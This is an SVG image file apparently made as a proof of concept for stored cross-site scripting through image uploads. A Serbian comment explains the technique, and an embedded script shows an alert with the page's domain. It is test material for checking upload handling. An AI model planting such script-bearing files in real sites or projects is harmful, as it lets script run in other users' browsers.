<?xml version="1.0" standalone="no"?>
<!-- SVG je XML i moze da sadrzi <script>. Ako se servira sa
     image/svg+xml i otvori u browseru, skripta se izvrsava -> stored XSS. -->
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <rect width="200" height="200" fill="#222"/>
  <text x="20" y="100" fill="#fff">SVG XSS</text>
  <script type="text/javascript">
    alert('XSS preko SVG uploada: ' + document.domain);
  </script>
</svg>
